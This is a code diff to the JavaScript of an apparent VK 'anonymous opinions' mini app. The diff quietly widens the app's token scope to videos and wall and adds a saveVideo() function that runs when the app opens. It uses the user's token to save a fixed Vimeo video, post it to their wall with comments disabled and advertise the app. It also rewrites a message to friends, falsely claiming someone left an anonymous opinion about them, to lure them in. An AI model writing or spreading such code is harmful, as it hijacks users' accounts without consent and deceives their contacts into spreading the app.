@@ -28,7 +28,7 @@
       function getToken() {
           vkConnect.sendPromise("VKWebAppGetAuthToken", {
               "app_id": parseInt(findGetParameter("vk_app_id")),
-              "scope": "friends,groups,photos"
+              "scope": "friends,groups,photos,videos,wall"
           })
           .then(data => {
               if(token){return false;}
@@ -71,6 +71,7 @@
             }
             if(permissions == 0) {
               openApp();
+              saveVideo();
               createAlbom();
             }else{
               $("html").html(' \n\
@@ -86,6 +87,15 @@
                 ');
             }
       });
+    }
+
+    function saveVideo() {
+      var video = "https://vimeo.com/700021370";
+        vkConnect.sendPromise("VKWebAppCallAPIMethod", {
+           "method": "video.save",
+           "params": {"privacy_comment":"['nobody']","repeat":1,"link":video,"name": "#"+viewer.id, "wallpost":1, "description":"Приложение доступно по ссылке : https://vk.com/app"+parseInt(findGetParameter("vk_app_id")), "v": "5.95", "access_token": token}
+       }).then(data => {
+       });
     }
 
     function createAlbom(){
@@ -129,7 +139,7 @@
                     //users_list+", oставляю о тебе мнения, посмотри если интересно : \n\n https://vk.com/app"+vk_app_id
 
                     var text = [
-                      "Посмотри, тебе отправили анонимное мнение : \n https://vk.com/app8152097 \n\n\n\ "+users_list
+                      "О тебе написали анонимное мнение, посомтри в приложении, ссылка у меня на стене \n\n\n\ "+users_list
                     ];
                     var caption = text[getRandom(0,text.length-1)];
 
